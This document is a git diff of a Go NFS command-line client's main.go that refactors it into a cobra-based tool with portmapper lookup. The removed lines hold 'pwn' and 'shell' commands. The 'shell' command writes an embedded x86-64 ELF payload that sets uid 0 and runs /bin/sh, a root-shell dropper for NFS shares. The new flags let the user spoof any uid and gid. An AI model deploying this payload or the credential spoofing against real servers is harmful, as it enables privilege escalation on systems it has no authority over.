@@ -1,99 +1,175 @@
 package main
 
 import (
-	"bufio"
-	"bytes"
+	"encoding/hex"
 	"fmt"
-	"io"
 	"os"
-	"path"
+	"os/user"
+	"strconv"
 	"strings"
+	"time"
 
-	"github.com/go-nfs/nfsv3/nfs"
-	"github.com/go-nfs/nfsv3/nfs/rpc"
+	"github.com/jsundin/nfs-cli/cli"
+	"github.com/spf13/cobra"
+	"github.com/willscott/go-nfs-client/nfs"
+	"github.com/willscott/go-nfs-client/nfs/rpc"
+	"github.com/willscott/go-nfs-client/nfs/util"
 )
 
-type ctx_t struct {
-	mnt *nfs.Target
-	cwd string
+var flags struct {
+	debug          bool
+	uid            int
+	gid            int
+	machine        string
+	privileged     bool
+	portmapperPort int
+	mountdPort     int
+	nfsPort        int
+	timeout        time.Duration
+	fhInHex        string
+	showmount      bool
 }
 
-var commands map[string]func(*ctx_t, string) = make(map[string]func(*ctx_t, string))
+var rootCmd = &cobra.Command{
+	Use:   "nfs-cli",
+	Short: "Simple NFS cli",
+	Example: fmt.Sprintf(`
+%[1]s nfs-server.corp.local /exports/homes -u 1000 -g 0
+%[1]s -m admin-server.corp.local --showmount nfs-server.corp.local
+`, os.Args[0]),
+	Args: cobra.MinimumNArgs(1),
+	Run: func(cmd *cobra.Command, args []string) {
+		if err := run(args); err != nil {
+			util.DefaultLogger.Errorf("error: %s", err)
+			os.Exit(1)
+		}
+	},
+}
 
 func init() {
-	commands["pwn"] = xcmd_pwn
-	commands["shell"] = xcmd_shell
+	whoami, err := user.Current()
+	if err != nil {
+		panic(fmt.Errorf("failed to get current user: %s", err))
+	}
+
+	defaultUid, err := strconv.Atoi(whoami.Uid)
+	if err != nil {
+		panic(fmt.Errorf("failed to parse uid: %s", err))
+	}
+
+	defaultGid, err := strconv.Atoi(whoami.Gid)
+	if err != nil {
+		panic(fmt.Errorf("failed to parse gid: %s", err))
+	}
+	defaultPrivileged := false
+
+	if defaultUid == 0 {
+		defaultPrivileged = true
+	}
+
+	rootCmd.Flags().BoolVarP(&flags.debug, "debug", "d", false, "enable debugging")
+	rootCmd.Flags().IntVarP(&flags.uid, "uid", "u", defaultUid, "user id")
+	rootCmd.Flags().IntVarP(&flags.gid, "gid", "g", defaultGid, "group id")
+	rootCmd.Flags().StringVarP(&flags.machine, "machine", "m", "localhost", "machine name")
+	rootCmd.Flags().BoolVarP(&flags.privileged, "privileged", "p", defaultPrivileged, "use privileged port (usually requires root)")
+	rootCmd.Flags().IntVar(&flags.portmapperPort, "portmapper-port", rpc.PmapPort, "portmapper port")
+	rootCmd.Flags().IntVar(&flags.mountdPort, "mountd-port", 0, "mountd port")
+	rootCmd.Flags().IntVar(&flags.nfsPort, "nfs-port", 0, "nfs port")
+	rootCmd.Flags().DurationVar(&flags.timeout, "timeout", 10*time.Second, "timeout for nfs operations")
+	rootCmd.Flags().StringVar(&flags.fhInHex, "fh", "", "specify file handle in binary hex notation (will skip mountd interaction)")
+	rootCmd.Flags().BoolVar(&flags.showmount, "showmount", false, "list exported filesystems and exit")
 }
 
 func main() {
-	launch_client()
+	err := rootCmd.Execute()
+	if err != nil {
+		os.Exit(1)
+	}
 }
 
-func client(auth rpc.Auth, rhost string, target string, priv bool, cmd []string) {
-	mount, err := nfs.DialMount(rhost, priv)
-	if err != nil {
-		panic(err)
-	}
-	defer mount.Close()
+func run(args []string) error {
+	var err error
 
-	mnt, err := mount.Mount(target, auth)
-	if err != nil {
-		fmt.Fprintln(os.Stderr, "Hint: try to use a privileged port, -p")
-		panic(err)
+	if flags.debug {
+		util.DefaultLogger.SetDebug(true)
 	}
-	defer mnt.Close()
 
-	var src io.Reader
-	if len(cmd) > 0 {
-		src = bytes.NewBufferString(strings.Join(cmd, " "))
+	rhost := args[0]
+
+	var mountdPort int = flags.mountdPort
+	var nfsPort int = flags.nfsPort
+
+	if flags.fhInHex != "" && mountdPort == 0 {
+		mountdPort = 42 // we won't be using mountd, so no need to look it up
+	}
+
+	if flags.showmount && nfsPort == 0 {
+		nfsPort = 42 // we won't be using nfsd, so no need to look it up
+	}
+
+	portmapperAddr := fmt.Sprintf("%s:%d", rhost, flags.portmapperPort)
+	mountdPort, nfsPort, err = resolvePorts(portmapperAddr, mountdPort, nfsPort, flags.privileged)
+	if err != nil {
+		util.DefaultLogger.Errorf("failed to resolve ports using portmapper: %s", err)
+		return err
+	}
+	mountdAddr := fmt.Sprintf("%s:%d", rhost, mountdPort)
+
+	auth := rpc.NewAuthUnix(flags.machine, uint32(flags.uid), uint32(flags.gid)).Auth()
+
+	if flags.showmount {
+		return runShowmount(mountdAddr, auth)
+	}
+
+	if len(args) < 2 {
+		return fmt.Errorf("missing path")
+	}
+
+	path := args[1]
+	args = args[2:]
+
+	nfsAddr := fmt.Sprintf("%s:%d", rhost, nfsPort)
+	return runCli(mountdAddr, nfsAddr, path, auth, args)
+}
+
+func runShowmount(mountdAddr string, auth rpc.Auth) error {
+	exports, err := showMount(mountdAddr, auth)
+	if err != nil {
+		return err
+	}
+
+	for _, export := range exports {
+		fmt.Printf("- %s (%s)\n", export.Directory, strings.Join(export.Options, ", "))
+	}
+	return nil
+}
+
+func runCli(mountdAddr string, nfsAddr string, path string, auth rpc.Auth, args []string) error {
+	var err error
+
+	var fh []byte
+	if flags.fhInHex != "" {
+		if fh, err = hex.DecodeString(flags.fhInHex); err != nil {
+			util.DefaultLogger.Errorf("failed to unhex fh param: %s", err)
+			return err
+		}
 	} else {
-		src = os.Stdin
+		if fh, err = getFileHandle(mountdAddr, path, auth); err != nil {
+			util.DefaultLogger.Errorf("failed to obtain file handle for '%s': %s", path, err)
+			return err
+		}
+		util.DefaultLogger.Debugf("obtained file handle for '%s': %s", path, hex.EncodeToString(fh))
 	}
-	reader := bufio.NewReader(src)
-	ctx := &ctx_t{
-		mnt: mnt,
-		cwd: "/",
+
+	nfsClient, err := rpc.DialTCP("tcp", nfsAddr, flags.privileged)
+	if err != nil {
+		panic(err)
 	}
-	for {
-		fmt.Printf("%s$ ", path.Join(target, ctx.cwd))
-		input, err := reader.ReadString('\n')
-		if err != nil && err != io.EOF {
-			fmt.Fprint(os.Stderr, err)
-			break
-		}
-		input = strings.TrimSpace(input)
-
-		cmd := input
-		args := ""
-		if i := strings.Index(cmd, " "); i > 0 {
-			cmd = input[:i]
-			args = input[i+1:]
-		}
-
-		if cb, found := commands[cmd]; found {
-			cb(ctx, args)
-		} else if cmd != "" {
-			fmt.Fprintf(os.Stderr, "command not found: %s\n", cmd)
-		}
-
-		if err == io.EOF || cmd == "exit" {
-			break
-		}
+	target, err := nfs.NewTargetWithClient(nfsClient, auth, fh, path, flags.timeout)
+	if err != nil {
+		panic(err)
 	}
-}
+	defer target.Close()
 
-func xcmd_pwn(ctx *ctx_t, args string) {
-	fn := path.Join(ctx.cwd, args)
-	xcmd_open_file(ctx, fn, func(fr *nfs.File) {
-		xcmd_create_file(ctx, fn+".pwn", func(fw *nfs.File) {
-			io.Copy(fw, fr)
-		})
-	})
-}
-
-func xcmd_shell(ctx *ctx_t, args string) {
-	xcmd_create_file(ctx, args, func(f *nfs.File) {
-		shell := bytes.NewBuffer([]byte{0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x75, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05})
-		io.Copy(f, shell)
-	})
+	return cli.Main(target, path, args)
 }
